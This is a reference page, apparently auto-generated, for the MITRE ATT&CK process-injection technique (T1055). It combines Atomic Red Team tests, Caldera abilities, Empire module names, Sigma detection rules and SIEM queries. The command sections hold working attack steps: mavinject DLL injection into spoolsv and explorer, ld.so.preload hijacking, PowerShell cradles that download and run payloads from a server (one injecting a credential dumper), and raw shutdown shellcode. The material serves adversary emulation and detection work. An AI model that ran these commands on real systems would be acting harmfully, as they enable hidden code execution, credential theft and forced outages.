
# Process Injection

## Description

### MITRE Description

> Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

### Windows

There are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Endgame Process Injection July 2017)

* **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.
* **Portable executable injection** involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)
* **Thread execution hijacking** involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.
* **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed "Early Bird injection", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)
* **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)

### Mac and Linux

Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)

* **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)
* **Ptrace system calls** can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)
* **/proc/[pid]/mem** provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)
* **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)

Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

## Aliases

```

```

## Additional Attributes

* Bypass: ['Process whitelisting', 'Anti-virus']
* Effective Permissions: ['User', 'Administrator', 'SYSTEM', 'root']
* Network: None
* Permissions: ['User', 'Administrator', 'SYSTEM', 'root']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1055

## Potential Commands

```
$mypid = #{process_id}
mavinject $mypid /INJECTRUNNING PathToAtomicsFolder\T1055\src\x64\T1055.dll

$mypid = (get-process spoolsv).id
mavinject $mypid /INJECTRUNNING #{dll_payload}

sudo sh -c 'echo PathToAtomicsFolder/T1055/bin/T1055.so > /etc/ld.so.preload'

sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'

sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'

LD_PRELOAD=PathToAtomicsFolder/T1055/bin/T1055.so ls

LD_PRELOAD=#{path_to_shared_library} ls

.\bin\T1055.exe

copy C:\Windows\System32\cmd.exe C:\svchost.exe
C:\svchost.exe /c echo T1055 > \\localhost\c$\T1055.txt

{'windows': {'psh': {'command': '$url="#{server}/file/download";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add("file","debugger.dll");\n$PBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -PBytes $PBytes -verbose'}}}
{'windows': {'psh': {'command': '$url="#{server}/file/download";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add("platform","windows");\n$wc.Headers.add("file","shared.go");\n$wc.Headers.add("server","#{server}");\n$PEBytes = $wc.DownloadData($url);\n$wc1 = New-Object System.net.webclient;\n$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\nIEX ($wc1.DownloadString($url));\nInvoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}\n'}}}
{'windows': {'psh': {'command': 'odbcconf.exe /S /A {REGSVR "C:\\Users\\Public\\sandcat.dll"}\n'}}}
{'windows': {'psh': {'command': '$explorer = Get-Process -Name explorer;\nmavinject.exe $explorer.id C:\\Users\\Public\\sandcat.dll\n'}}}
{'linux': {'shellcode_amd64,shellcode_386': {'command': '0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n'}}}
powershell/code_execution/invoke_reflectivepeinjection
powershell/code_execution/invoke_reflectivepeinjection
powershell/code_execution/invoke_shellcode
powershell/code_execution/invoke_shellcode
powershell/code_execution/invoke_shellcodemsil
powershell/code_execution/invoke_shellcodemsil
powershell/credentials/credential_injection
powershell/credentials/credential_injection
powershell/management/psinject
powershell/management/psinject
powershell/management/reflective_inject
powershell/management/reflective_inject
powershell/management/shinject
powershell/management/shinject
python/management/osx/shellcodeinject64
python/management/osx/shellcodeinject64
```
echo #{path_to_shared_library} > /etc/ld.so.preload
```
```
echo /home/$USER/random.so > /etc/ld.so.preload
```
```

## Commands Dataset

```
[{'command': '$mypid = #{process_id}\n'
             'mavinject $mypid /INJECTRUNNING '
             'PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': '$mypid = (get-process spoolsv).id\n'
             'mavinject $mypid /INJECTRUNNING #{dll_payload}\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': "sudo sh -c 'echo PathToAtomicsFolder/T1055/bin/T1055.so > "
             "/etc/ld.so.preload'\n",
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': "sudo sh -c 'echo #{path_to_shared_library} > "
             "/etc/ld.so.preload'\n",
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': "sudo sh -c 'echo #{path_to_shared_library} > "
             "/etc/ld.so.preload'\n",
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': 'LD_PRELOAD=PathToAtomicsFolder/T1055/bin/T1055.so ls\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': 'LD_PRELOAD=#{path_to_shared_library} ls\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': '.\\bin\\T1055.exe\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': 'copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe\n'
             'C:\\svchost.exe /c echo T1055 > \\\\localhost\\c$\\T1055.txt\n',
  'name': None,
  'source': 'atomics/T1055/T1055.yaml'},
 {'command': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n'
                                             '$wc=New-Object '
                                             'System.Net.WebClient;\n'
                                             '$wc.Headers.add("file","debugger.dll");\n'
                                             '$PBytes = '
                                             '$wc.DownloadData($url);\n'
                                             '$wc1 = New-Object '
                                             'System.net.webclient;\n'
                                             '$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\n'
                                             'IEX '
                                             '($wc1.DownloadString($url));\n'
                                             'Invoke-ReflectivePEInjection '
                                             '-PBytes $PBytes -verbose'}}},
  'name': 'Injects cred dumper exe into an available process',
  'source': 'data/abilities/credential-access/c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7.yml'},
 {'command': {'windows': {'psh': {'command': '$url="#{server}/file/download";\n'
                                             '$wc=New-Object '
                                             'System.Net.WebClient;\n'
                                             '$wc.Headers.add("platform","windows");\n'
                                             '$wc.Headers.add("file","shared.go");\n'
                                             '$wc.Headers.add("server","#{server}");\n'
                                             '$PEBytes = '
                                             '$wc.DownloadData($url);\n'
                                             '$wc1 = New-Object '
                                             'System.net.webclient;\n'
                                             '$wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");\n'
                                             'IEX '
                                             '($wc1.DownloadString($url));\n'
                                             'Invoke-ReflectivePEInjection '
                                             '-verbose -PBytes $PEbytes '
                                             '-ProcId #{host.process.id}\n'}}},
  'name': 'Injects sandcat DLL into an available process',
  'source': 'data/abilities/defense-evasion/a398986f-31b0-436a-87e9-c8e82c028f3c.yml'},
 {'command': {'windows': {'psh': {'command': 'odbcconf.exe /S /A {REGSVR '
                                             '"C:\\Users\\Public\\sandcat.dll"}\n'}}},
  'name': 'Leverage odbcconf for DLL injection',
  'source': 'data/abilities/defense-evasion/a74bc239-a196-4f7e-8d5c-fe8c0266071c.yml'},
 {'command': {'windows': {'psh': {'command': '$explorer = Get-Process -Name '
                                             'explorer;\n'
                                             'mavinject.exe $explorer.id '
                                             'C:\\Users\\Public\\sandcat.dll\n'}}},
  'name': 'Leverage Mavinject (signed binary) for DLL injection',
  'source': 'data/abilities/defense-evasion/e5bcefee-262d-4568-a261-e8a20855ec81.yml'},
 {'command': {'linux': {'shellcode_amd64,shellcode_386': {'command': '0x48, '
                                                                     '0x31, '
                                                                     '0xc0, '
                                                                     '0x48, '
                                                                     '0x31, '
                                                                     '0xd2, '
                                                                     '0x50, '
                                                                     '0x6a, '
                                                                     '0x77, '
                                                                     '0x66, '
                                                                     '0x68, '
                                                                     '0x6e, '
                                                                     '0x6f, '
                                                                     '0x48, '
                                                                     '0x89, '
                                                                     '0xe3, '
                                                                     '0x50, '
                                                                     '0x66, '
                                                                     '0x68, '
                                                                     '0x2d, '
                                                                     '0x68, '
                                                                     '0x48, '
                                                                     '0x89, '
                                                                     '0xe1, '
                                                                     '0x50, '
                                                                     '0x49, '
                                                                     '0xb8, '
                                                                     '0x2f, '
                                                                     '0x73, '
                                                                     '0x62, '
                                                                     '0x69, '
                                                                     '0x6e, '
                                                                     '0x2f, '
                                                                     '0x2f, '
                                                                     '0x2f, '
                                                                     '0x49, '
                                                                     '0xba, '
                                                                     '0x73, '
                                                                     '0x68, '
                                                                     '0x75, '
                                                                     '0x74, '
                                                                     '0x64, '
                                                                     '0x6f, '
                                                                     '0x77, '
                                                                     '0x6e, '
                                                                     '0x41, '
                                                                     '0x52, '
                                                                     '0x41, '
                                                                     '0x50, '
                                                                     '0x48, '
                                                                     '0x89, '
                                                                     '0xe7, '
                                                                     '0x52, '
                                                                     '0x53, '
                                                                     '0x51, '
                                                                     '0x57, '
                                                                     '0x48, '
                                                                     '0x89, '
                                                                     '0xe6, '
                                                                     '0x48, '
                                                                     '0x83, '
                                                                     '0xc0, '
                                                                     '0x3b, '
                                                                     '0x0f, '
                                                                     '0x05\n'}}},
  'name': 'Force shutdown a target system using Process Injection and raw '
          'shellcode',
  'source': 'data/abilities/privilege-escalation/0821b0b0-7902-4a7b-8052-80bda5a43684.yml'},
 {'command': 'powershell/code_execution/invoke_reflectivepeinjection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_reflectivepeinjection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcode',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcode',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcodemsil',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/code_execution/invoke_shellcodemsil',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/credential_injection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/credential_injection',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/psinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/psinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/reflective_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/reflective_inject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/shinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/shinject',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/osx/shellcodeinject64',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'python/management/osx/shellcodeinject64',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'},
 {'command': 'echo #{path_to_shared_library} > /etc/ld.so.preload',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'},
 {'command': 'echo /home/$USER/random.so > /etc/ld.so.preload',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': '```', 'name': None, 'source': 'Kirtar22/Litmus_Test'}]
```

## Potential Detections

```json
[{'data_source': 'auditlogs (audit.rules)'},
 {'data_source': 'bash_history logs'},
 {'data_source': {'author': 'Olaf Hartong, Florian Roth, Aleksey Potapov, '
                            'oscd.community',
                  'date': '2018/11/30',
                  'description': 'Detects a possible remote threat creation '
                                 'with certain characteristics which are '
                                 'typical for Cobalt Strike beacons',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 8,
                                              'TargetProcessAddress|endswith': ['0B80',
                                                                                '0C7C',
                                                                                '0C88']}},
                  'falsepositives': ['unknown'],
                  'id': '6309645e-122d-4c5b-bb2b-22e4f9c2fa42',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'modified': '2019/11/08',
                  'references': ['https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f',
                                 'https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion', 'attack.t1055'],
                  'title': 'CobaltStrike Process Injection'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/11/06',
                  'description': 'Detects the creation of a named pipe used by '
                                 'known APT malware',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': [17, 18],
                                              'PipeName': ['\\isapi_http',
                                                           '\\isapi_dg',
                                                           '\\isapi_dg2',
                                                           '\\sdlrpc',
                                                           '\\ahexec',
                                                           '\\winsession',
                                                           '\\lsassw',
                                                           '\\46a676ab7f179e511e30dd2dc41bd388',
                                                           '\\9f81f59bc58452127884ce513865ed20',
                                                           '\\e710f28d59aa529d6792ca6ff0ca1b34',
                                                           '\\rpchlp_3',
                                                           '\\NamePipe_MoreWindows',
                                                           '\\pcheap_reuse',
                                                           '\\msagent_*']}},
                  'falsepositives': ['Unkown'],
                  'id': 'fe3ac066-98bb-432a-b1e7-a5229cb39d4a',
                  'level': 'critical',
                  'logsource': {'definition': 'Note that you have to configure '
                                              'logging for PipeEvents in '
                                              'Symson config',
                                'product': 'windows',
                                'service': 'sysmon'},
                  'references': ['Various sources'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Malicious Named Pipe'}},
 {'data_source': {'author': 'John Lambert (tech), Florian Roth (rule)',
                  'date': '2017/03/04',
                  'description': 'Detects a process access to verclsid.exe '
                                 'that injects shellcode from a Microsoft '
                                 'Office application / VBA macro',
                  'detection': {'combination1': {'CallTrace': '*|UNKNOWN(*VBE7.DLL*'},
                                'combination2': {'CallTrace': '*|UNKNOWN*',
                                                 'SourceImage': '*\\Microsoft '
                                                                'Office\\\\*'},
                                'condition': 'selection and 1 of combination*',
                                'selection': {'EventID': 10,
                                              'GrantedAccess': '0x1FFFFF',
                                              'TargetImage': '*\\verclsid.exe'}},
                  'falsepositives': ['unknown'],
                  'id': 'b7967e22-3d7e-409b-9ed5-cdae3f9243a1',
                  'level': 'high',
                  'logsource': {'definition': 'Use the following config to '
                                              'generate the necessary Event ID '
                                              '10 Process Access events: '
                                              '<ProcessAccess '
                                              'onmatch="include"><CallTrace '
                                              'condition="contains">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess '
                                              'onmatch="exclude"><CallTrace '
                                              'condition="excludes">UNKNOWN</CallTrace></ProcessAccess>',
                                'product': 'windows',
                                'service': 'sysmon'},
                  'references': ['https://twitter.com/JohnLaTwC/status/837743453039534080'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Malware Shellcode in Verclsid Target Process'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2018/02/22',
                  'description': 'Detects Winword starting uncommon sub '
                                 'process FLTLDR.exe as used in exploits for '
                                 'CVE-2017-0261 and CVE-2017-0262',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': '*\\FLTLDR.exe*',
                                              'ParentImage': '*\\WINWORD.EXE'}},
                  'falsepositives': ['Several false positives identified, '
                                     'check for suspicious file names or '
                                     'locations (e.g. Temp folders)'],
                  'id': '864403a1-36c9-40a2-a982-4c9a45f7d833',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Exploit for CVE-2017-0261'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/11/15',
                  'description': 'Detects exploitation attempt of privilege '
                                 'escalation vulnerability via '
                                 'SetupComplete.cmd and '
                                 'PartnerSetupComplete.cmd decribed in '
                                 'CVE-2019-1378',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'Image': ['C:\\Windows\\System32\\\\*',
                                                     'C:\\Windows\\SysWOW64\\\\*',
                                                     'C:\\Windows\\WinSxS\\\\*',
                                                     'C:\\Windows\\Setup\\\\*']},
                                'selection': {'ParentCommandLine': ['*\\cmd.exe '
                                                                    '/c '
                                                                    'C:\\Windows\\Setup\\Scripts\\SetupComplete.cmd',
                                                                    '*\\cmd.exe '
                                                                    '/c '
                                                                    'C:\\Windows\\Setup\\Scripts\\PartnerSetupComplete.cmd']}},
                  'falsepositives': ['Unknown'],
                  'id': '1c373b6d-76ce-4553-997d-8c1da9a6b5f5',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.embercybersecurity.com/blog/cve-2019-1378-exploiting-an-access-control-privilege-escalation-vulnerability-in-windows-10-update-assistant-wua'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Exploiting SetupComplete.cmd CVE-2019-1378'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/01/10',
                  'description': 'Detects typical Dridex process patterns',
                  'detection': {'condition': '1 of them',
                                'selection1': {'CommandLine': '*\\svchost.exe '
                                                              'C:\\Users\\\\*\\Desktop\\\\*'},
                                'selection2': {'CommandLine': ['*whoami.exe '
                                                               '/all',
                                                               '*net.exe view'],
                                               'ParentImage': '*\\svchost.exe*'}},
                  'falsepositives': ['Unlikely'],
                  'id': 'e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e',
                  'level': 'critical',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://app.any.run/tasks/993daa5e-112a-4ff6-8b5a-edbcec7c7ba3'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion',
                           'attack.privilege_escalation',
                           'attack.t1055'],
                  'title': 'Dridex Process Pattern'}},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['DLL monitoring']},
 {'data_source': ['Named Pipes']},
 {'data_source': ['API monitoring']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['Sysmon ID 7', 'DLL monitoring']},
 {'data_source': ['Sysmon ID 17', ' 18', 'Named Pipes']},
 {'data_source': ['API monitoring']}]
```

## Potential Queries

```json
[{'name': 'Process Injection Process',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_command_line contains '
           '"*Invoke-DllInjection*"or process_command_line contains '
           '"C:\\\\windows\\\\sysnative\\\\"'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=linux sourcetype=linux_audit preload_lib'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None,
  'product': 'Splunk',
  'query': '-w /etc/ld.so.preload -p wa -k preload_lib'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None, 'product': 'Splunk', 'query': '```'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=linux sourcetype="bash_history" ld.so.preload | table '
           'host,user_name,bash_command'},
 {'name': None, 'product': 'Splunk', 'query': '```'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Process Injection': {'atomic_tests': [{'auto_generated_guid': '74496461-11a1-4982-b439-4d87a550d254',
                                                                 'dependencies': [{'description': 'Utility '
                                                                                                  'to '
                                                                                                  'inject '
                                                                                                  'must '
                                                                                                  'exist '
                                                                                                  'on '
                                                                                                  'disk '
                                                                                                  'at '
                                                                                                  'specified '
                                                                                                  'location '
                                                                                                  '(#{dll_payload})\n',
                                                                                   'get_prereq_command': 'New-Item '
                                                                                                         '-Type '
                                                                                                         'Directory '
                                                                                                         '(split-path '
                                                                                                         '#{dll_payload}) '
                                                                                                         '-ErrorAction '
                                                                                                         'ignore '
                                                                                                         '| '
                                                                                                         'Out-Null\n'
                                                                                                         'Invoke-WebRequest '
                                                                                                         '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" '
                                                                                                         '-OutFile '
                                                                                                         '"#{dll_payload}"\n',
                                                                                   'prereq_command': 'if '
                                                                                                     '(Test-Path '
                                                                                                     '#{dll_payload}) '
                                                                                                     '{exit '
                                                                                                     '0} '
                                                                                                     'else '
                                                                                                     '{exit '
                                                                                                     '1}\n'}],
                                                                 'dependency_executor_name': 'powershell',
                                                                 'description': 'Windows '
                                                                                '10 '
                                                                                'Utility '
                                                                                'To '
                                                                                'Inject '
                                                                                'DLLS.\n'
                                                                                '\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'powershell.exe '
                                                                                'will '
                                                                                'download '
                                                                                'T1055.dll '
                                                                                'to '
                                                                                'disk. '
                                                                                'Powershell '
                                                                                'will '
                                                                                'then '
                                                                                'spawn '
                                                                                'mavinject.exe '
                                                                                'to '
                                                                                'perform '
                                                                                'process '
                                                                                'injection '
                                                                                'in '
                                                                                'T1055.dll.\n',
                                                                 'executor': {'command': '$mypid '
                                                                                         '= '
                                                                                         '#{process_id}\n'
                                                                                         'mavinject '
                                                                                         '$mypid '
                                                                                         '/INJECTRUNNING '
                                                                                         '#{dll_payload}\n',
                                                                              'elevation_required': True,
                                                                              'name': 'powershell'},
                                                                 'input_arguments': {'dll_payload': {'default': 'PathToAtomicsFolder\\T1055\\src\\x64\\T1055.dll',
                                                                                                     'description': 'DLL '
                                                                                                                    'to '
                                                                                                                    'Inject',
                                                                                                     'type': 'Path'},
                                                                                     'process_id': {'default': '(get-process '
                                                                                                               'spoolsv).id',
                                                                                                    'description': 'PID '
                                                                                                                   'of '
                                                                                                                   'input_arguments',
                                                                                                    'type': 'Integer'}},
                                                                 'name': 'Process '
                                                                         'Injection '
                                                                         'via '
                                                                         'mavinject.exe',
                                                                 'supported_platforms': ['windows']},
                                                                {'auto_generated_guid': '39cb0e67-dd0d-4b74-a74b-c072db7ae991',
                                                                 'dependencies': [{'description': 'The '
                                                                                                  'shared '
                                                                                                  'library '
                                                                                                  'must '
                                                                                                  'exist '
                                                                                                  'on '
                                                                                                  'disk '
                                                                                                  'at '
                                                                                                  'specified '
                                                                                                  'location '
                                                                                                  '(#{path_to_shared_library})\n',
                                                                                   'get_prereq_command': 'gcc '
                                                                                                         '-shared '
                                                                                                         '-fPIC '
                                                                                                         '-o '
                                                                                                         '#{path_to_shared_library} '
                                                                                                         '#{path_to_shared_library_source}        \n',
                                                                                   'prereq_command': 'if '
                                                                                                     '[ '
                                                                                                     '-f '
                                                                                                     '#{path_to_shared_library '
                                                                                                     ']; '
                                                                                                     'then '
                                                                                                     'exit '
                                                                                                     '0; '
                                                                                                     'else '
                                                                                                     'exit '
                                                                                                     '1; '
                                                                                                     'fi;\n'}],
                                                                 'dependency_executor_name': 'bash',
                                                                 'description': 'This '
                                                                                'test '
                                                                                'adds '
                                                                                'a '
                                                                                'shared '
                                                                                'library '
                                                                                'to '
                                                                                'the '
                                                                                '`ld.so.preload` '
                                                                                'list '
                                                                                'to '
                                                                                'execute '
                                                                                'and '
                                                                                'intercept '
                                                                                'API '
                                                                                'calls. '
                                                                                'This '
                                                                                'technique '
                                                                                'was '
                                                                                'used '
                                                                                'by '
                                                                                'threat '
                                                                                'actor '
                                                                                'Rocke '
                                                                                'during '
                                                                                'the '
                                                                                'exploitation '
                                                                                'of '
                                                                                'Linux '
                                                                                'web '
                                                                                'servers. '
                                                                                'This '
                                                                                'requires '
                                                                                'the '
                                                                                '`glibc` '
                                                                                'package.\n'
                                                                                '\n'
                                                                                'Upon '
                                                                                'successful '
                                                                                'execution, '
                                                                                'bash '
                                                                                'will '
                                                                                'echo '
                                                                                '`../bin/T1055.so` '
                                                                                'to '
                                                                                '/etc/ld.so.preload. \n',
                                                                 'executor': {'cleanup_command': None,
                                                                              'command': 'sudo '
                                                                                         'sh '
                                                                                         '-c '
                                                                                         "'echo "
                                                                                         '#{path_to_shared_library} '
                                                                                         '> '
                                                                                         "/etc/ld.so.preload'\n",
                                                                              'elevation_required': True,
                                                                              'name': 'bash'},
                                                                 'input_arguments': {'path_to_shared_library': {'default': 'PathToAtomicsFolder/T1055/bin/T1055.so',
                                                                                                                'description': 'Path '
                                                                                                                               'to '
                                                                                                                               'a '
                                                                                                                               'shared '
                                                                                                                               'library '
                                                                                                                               'object',
                                                                                                                'type': 'Path'},
                                                                                     'path_to_shared_library_source': {'default': 'PathToAtomicsFolder/T1055/src/Linux/T1055.c',
                                                                                                                       'description': 'Path '
                                                                                                                                      'to '
                                                                                                                                      'a '
                                                                                                                                      'shared '
                                                                                                                                      'library '
                                                                                                                                      'source '
                                                                                                                                      'code',
                                                                                                                       'type': 'Path'},
                                                                                     'tmp_folder': {'default': '/tmp/1055',
                                                                                                    'description': 'Path '
                                                                                                                   'of '
                                                                                                                   'the '
                                                                                                                   'temp '
                                                                                                                   'folder',
                                                                                                    'type': 'Path'}},
                                                                 'name': 'Shared '
                                                                         'Library '
                                                                         'Injection '
                                                                         'via '
                                                                         '/etc/ld.so.preload',
                                                                 'supported_platforms': ['linux']},
                                                                {'auto_generated_guid': 'bc219ff7-789f-4d51-9142-ecae3397deae',
                                                                 'dependencies': [{'description': 'The '
                                                                                                  'shared '
                                                                                                  'library '
                                                                                                  'must '
                                                                                                  'exist '
                                                                                                  'on '
                                                                                                  'disk '
                                                                                                  'at '
                                                                                                  'specified '
                                                                                                  'location '
                                                                                                  '(#{path_to_shared_library})\n',
                                                                                   'get_prereq_command': 'gcc '
                                                                                                         '-shared '
                                                                                                         '-fPIC '
                                                                                                         '-o '
                                                                                                         '#{path_to_shared_library} '
                                                                                                         '#{path_to_shared_library_source}\n',
                                                                                   'prereq_command': 'if '
                                                                                                     '[ '
                                                                                                     '-f '
                                                                                                     '#{path_to_shared_library} '
